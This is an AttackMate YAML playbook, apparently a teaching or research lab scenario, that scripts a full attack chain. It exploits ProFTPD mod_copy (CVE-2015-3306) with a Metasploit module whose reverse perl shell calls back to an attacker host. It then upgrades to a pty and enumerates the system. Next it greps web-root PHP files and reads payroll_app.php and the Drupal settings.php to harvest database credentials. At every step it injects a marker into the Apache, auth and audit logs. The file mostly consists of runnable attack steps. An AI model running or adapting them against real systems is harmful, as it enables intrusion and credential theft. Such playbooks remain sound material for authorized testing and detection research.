#
# Author: AttackMate Initial-Access experiment (MIRANDA teaching example)
# Description:
#     ProFTPD foothold -> credential access. ProFTPD mod_copy (CVE-2015-3306) lands a
#     raw command shell as www-data; we upgrade to a pty and run the standard core
#     (which-python, id, uname), then hunt DB credentials under the web root (grep the
#     PHP, payroll_app.php, drupal settings.php). Enumeration only.
#
#     Tactic flow: Initial Access -> Discovery -> Credential Access
#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
#
# AUTHORIZED USE ONLY:
#     Run this only against systems you own or have explicit written permission to test.
#
vars:
  TARGET: 172.28.128.3
  ATTACKER: 172.28.128.10    # Operator host (LHOST the payload calls back to)
  LPORT: "4445"
  PAYLOAD: cmd/unix/reverse_perl   # modcopy target accepts cmd/unix/* only (perl is on the target)
  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that
  # contains a space, which would break the marker join across log layers.
  INJECTION: "this_is_the_injection"

commands:

  # ===================== Phase 0: pre-exploit log poisoning =====================
  - type: http-client
    cmd: GET
    url: http://$TARGET/?probe=1
    useragent: "$INJECTION"
    exit_on_error: False
    metadata:
      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
      techniques: "T1562.006"
      tactics: "Defense Evasion"

  - type: sleep
    seconds: 4
    min_sec: 1
    random: True
    metadata:
      description: "Human-paced jitter between the two probes"

  - type: ssh
    cmd: id
    username: "$INJECTION"
    password: "x"
    hostname: $TARGET
    interactive: False
    exit_on_error: False
    metadata:
      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
      techniques: "T1110.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  # ===================== Phase 1: foothold =====================
  # Exploit ProFTPD mod_copy to drop and trigger a payload via the web root.
  - type: msf-module
    cmd: exploit/unix/ftp/proftpd_modcopy_exec
    creates_session: ftp_shell
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    options:
      RHOSTS: $TARGET
      SITEPATH: /var/www/html
      TARGETURI: /
    metadata:
      description: "Exploit ProFTPD mod_copy (CVE-2015-3306) to gain a command-shell session"
      techniques: "T1190,T1059"
      tactics: "Initial Access,Execution"

  # ===================== Phase 2: standard post-landing core =====================
  # Raw command shell -> no `shell` drop. Check for python, upgrade to a pty, discover.
  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "bash -c 'which python' \"$INJECTION\""
    exit_on_error: False
    metadata:
      description: "Locate a Python interpreter for the pty upgrade; execve poisoned with the marker"
      techniques: "T1518,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: ftp_shell
    read: True
    cmd: read-output
    save: /tmp/ia_proftpd_ca_which_python.txt
    exit_on_error: False
    metadata:
      description: "Read the which-python output (confirm /usr/bin/python is present)"
      techniques: "T1518"
      tactics: "Discovery"

  # Upgrade the dumb shell to an interactive pty (shell-spawn; left UNWRAPPED so the
  # spawned bash persists on the channel -- a bash -c wrapper would run it in a subshell).
  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    exit_on_error: False
    metadata:
      description: "Upgrade the shell to an interactive pty via python pty.spawn"
      techniques: "T1059.004"
      tactics: "Execution"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the pty bash come up"

  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "bash -c 'id' \"$INJECTION\""
    exit_on_error: False
    metadata:
      description: "Current identity (expect www-data); execve poisoned with the marker"
      techniques: "T1033,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: ftp_shell
    read: True
    cmd: read-output
    save: /tmp/ia_proftpd_ca_disc_id.txt
    exit_on_error: False
    metadata:
      description: "Read the id output (foothold proof)"
      techniques: "T1033"
      tactics: "Discovery"

  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "bash -c 'uname -a' \"$INJECTION\""
    exit_on_error: False
    metadata:
      description: "Kernel/architecture; execve poisoned with the marker"
      techniques: "T1082,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: ftp_shell
    read: True
    cmd: read-output
    save: /tmp/ia_proftpd_ca_disc_uname.txt
    exit_on_error: False
    metadata:
      description: "Read the uname output"
      techniques: "T1082"
      tactics: "Discovery"

  # ===================== Category: credential access =====================
  # Hunt DB credentials under the web root. The sweep surfaces any .env/wp-config.php;
  # we then cat the two cred files known to exist on this box.
  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "bash -c 'find /var/www -name \"*.php\" | xargs grep -l -iE \"password|db_|mysql\" 2>/dev/null' \"$INJECTION\""
    exit_on_error: False
    metadata:
      description: "Grep web-root PHP for DB credentials; execve poisoned with the marker"
      techniques: "T1552.001,T1083,T1562.006"
      tactics: "Credential Access,Discovery,Defense Evasion"

  - type: sleep
    seconds: 3
    metadata:
      description: "Let the grep sweep finish"

  - type: msf-session
    session: ftp_shell
    read: True
    cmd: read-output
    save: /tmp/ia_proftpd_ca_phpgrep.txt
    exit_on_error: False
    metadata:
      description: "Read the list of PHP files that reference DB credentials"
      techniques: "T1552.001"
      tactics: "Credential Access"

  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "bash -c 'cat /var/www/html/payroll_app.php' \"$INJECTION\""
    exit_on_error: False
    metadata:
      description: "Read the payroll app source (known plaintext DB creds); execve marker"
      techniques: "T1552.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: ftp_shell
    read: True
    cmd: read-output
    save: /tmp/ia_proftpd_ca_payroll.txt
    exit_on_error: False
    metadata:
      description: "Read the payroll_app.php credentials"
      techniques: "T1552.001"
      tactics: "Credential Access"

  - type: msf-session
    session: ftp_shell
    write: True
    cmd: "bash -c 'cat /var/www/html/drupal/sites/default/settings.php' \"$INJECTION\""
    exit_on_error: False
    metadata:
      description: "Read the Drupal settings.php (DB user/password/host); execve marker"
      techniques: "T1552.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: ftp_shell
    read: True
    cmd: read-output
    save: /tmp/ia_proftpd_ca_settings.txt
    exit_on_error: False
    metadata:
      description: "Read the Drupal DB credentials from settings.php"
      techniques: "T1552.001"
      tactics: "Credential Access"

  - type: debug
    cmd: "[proftpd_cred_access] credential access complete -> $RESULT_STDOUT"
    metadata:
      description: "Surface the last credential-access output inline"
      techniques: "T1552.001"
      tactics: "Credential Access"
